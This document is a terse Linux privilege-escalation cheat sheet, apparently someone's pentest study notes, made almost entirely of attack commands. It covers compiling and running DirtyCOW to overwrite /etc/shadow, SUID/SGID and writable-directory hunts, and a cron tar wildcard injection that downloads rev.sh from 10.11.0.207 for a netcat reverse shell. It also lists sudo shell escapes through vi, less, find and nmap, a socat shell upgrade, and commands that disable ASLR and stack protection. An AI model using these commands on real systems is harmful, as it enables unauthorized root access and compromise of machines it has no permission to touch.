linux privesc exploitation

KERNEL EXPLOITS
requirements
1. vulnerable kernel
2. matching exploit
3. ability to transfer the exploit onto the target
	FTP, TFTP, SCP, wget, curl, samba
4. ability to execute the exploit on the target
	gcc, cc, python, perl, ruby, nasm
		find / -name perl*
5. ability to upload files
	wget, nc, ncat, netcat, ftp, tftp, curl
	
DirtyCOW
gcc -lpthread dirtyCOW.c -o dirtyCOW
./dirtyCOW /etc/shadow
su root
id
cp /etc/shadow.bak /etc/shadow


FILESYSTEM PERMISSIONS
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
	-search filesystem for writeable directories
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 5 -exec ls -ld {} \; 2>/dev/null
	-search for filesystem for files to run as SGID or SUID
find / -writable -type d 2>/dev/null
	-find world-writeable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
	-find world-writeable and executable folders
find /dir -xdev \( -nouser -o -nogroup\) -print
	-find no owner files
	
WEAK SERVICES AND CONFIGURATIONS

ls -ls *conf
"wildcard injection"
ls
nano
	ctrl+x > y > -rf
rm *
ls
	-nano allows creation of filenames beginning with flags, e.g."-",
	ergo the file -rf interpreted as a flag will force remove recursively
	when in a directory where rm is called
0 5 * * * root tar -zcf /var/backups/home.tgx /home/* /root/*
	-cron job injecting wildcards to backup all user directories at 5am daily
wget 10.11.0.207/rev.sh
tar --checkpoint=1 --checkpoint-action=exec="sh /bin/rev.sh"
	or
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh /bin/rev.sh"
attacker> nc -lvp 3333
	tar checkpoint-action is stored local code execution procedure, e.g.
	one that can be expected to execute regularly with a cron job^

SUID/SGID
find directory –user root –perm –4000 –exec ls –ld {} \; >/tmp/setuid
find / -perm -u=s -type f 2>/dev/null
	-setuid inventory searches
su user
sudo command
nmap -interactive
nmap> !sh
id
	nmap requires root priviliges to scan registered ports, spawning a shell
	in interactive mode inherits the privileges of nmap
let's abuse sudo
sudo vi
:shell
sudo less file.txt
!bash
sudo more file.txt
!bash
sudo find /etc -exec sh -i \;
	suid binaries with -e or --exec paramters may be exploitable
sh -c export TERM=xterm;PS1='$PWD>';export PS1;/bin/bash -i
/sbin/axx /bin/sh
/sbin/axx /bin/bash
/sbin/getty 38400 tty1

/usr/bin/python2.5 /usr/bin/fail2ban-server -b -s /var/run/fail2ban/fail2ban.sock

	
Scripting languages
python -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'


OTHER
'enter' x 93
	error in scripts/local-top/cryptroot from Cyrptsetup util provides
	access to root initramfs following a transient hardware fault in
	calling script handler scripts/local drops the user in a root shell
	-requires system use LUKS (Cryptsetup default) disk encryption

NON-INTERACTIVE SHELL?
socat file:`tty`,raw,echo=0 tcp-listen:8999
socat tcp:127.0.0.1:8999 exec:"bash -li",pty,stderr,setsid,sigint,sane


COMPILING
gcc -fno-stack-protector -z execstack 
echo 0 > /proc/sys/kernel/randomize_va_space
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space